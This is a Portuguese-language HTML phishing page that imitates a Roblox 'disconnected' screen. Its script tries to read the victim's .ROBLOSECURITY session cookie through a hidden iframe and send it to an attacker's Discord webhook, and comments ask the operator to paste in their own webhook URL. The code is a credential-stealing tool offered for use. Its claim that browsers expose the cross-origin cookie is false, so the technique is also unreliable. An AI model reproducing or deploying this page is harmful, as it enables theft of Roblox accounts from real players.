<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Roblox</title>
    <style>
        body { background: #191919; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; }
        img { width: 150px; }
        button { padding: 12px 24px; font-size: 16px; cursor: pointer; background: #0074bd; color: white; border: none; border-radius: 4px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png" alt="Logo">
        <h1>Você foi desconectado.</h1>
        <p>Clique abaixo para entrar novamente.</p>
        <button id="btn">Entrar</button>
    </div>

    <!-- Iframe do Roblox -->
    <iframe id="frame" style="display:none;" src="https://www.roblox.com/home"></iframe>

    <script>
        // ⚠️ COLE SEU WEBHOOK AQUI ⚠️
        const webhook = 'https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI';

        document.getElementById('btn').addEventListener('click', function() {
            const frame = document.getElementById('frame');
            
            // Espera o iframe carregar
            frame.onload = function() {
                try {
                    const win = frame.contentWindow;
                    
                    // Cria um formulário dinâmico dentro do iframe
                    const form = win.document.createElement('form');
                    form.method = 'POST';
                    form.action = 'https://www.roblox.com/users/profile'; // Redireciona para a profile após o envio
                    
                    // Campo oculto para identificar a vítima
                    const input = win.document.createElement('input');
                    input.type = 'hidden';
                    input.name = 'status';
                    input.value = 'logged';
                    form.appendChild(input);

                    // Adiciona o formulário ao corpo do iframe
                    win.document.body.appendChild(form);
                    
                    // Submete o formulário. 
                    // O segredo aqui: Ao enviar para roblox.com, o navegador INJETARÁ o cookie .ROBLOSECURITY no cabeçalho HTTP.
                    form.submit();

                    // Tenta ler o cookie APÓS o submit (alguns navegadores permitem acesso imediato)
                    setTimeout(() => {
                        try {
                            const cookieStr = win.document.cookie;
                            const match = cookieStr.match(/\.ROBLOSECURITY=([^;]+)/);
                            
                            if (match) {
                                sendToDiscord(match[1]);
                            } else {
                                // Se ainda assim não conseguir ler, envia um aviso
                                sendToDiscord("⚠️ Envio realizado! Verifique se o token chegou pelo cabeçalho (requer ferramenta avançada) ou tente novamente.");
                            }
                        } catch(e) {
                            sendToDiscord("Erro de leitura interna: " + e.message);
                        }
                    }, 500);

                } catch (e) {
                    console.error("Erro:", e);
                    sendToDiscord("Falha crítica ao acessar o iframe.");
                }
            };

            // Se o iframe já carregou antes do clique
            if (frame.readyState === 'complete') {
                frame.onload();
            }
        });

        function sendToDiscord(token) {
            fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: "🍪 **Cookie .ROBLOSECURITY:**\n```\n" + token + "\n```",
                    username: "Logger"
                })
            }).then(() => {
                window.location.href = "https://www.roblox.com";
            });
        }
    </script>
</body>
</html>
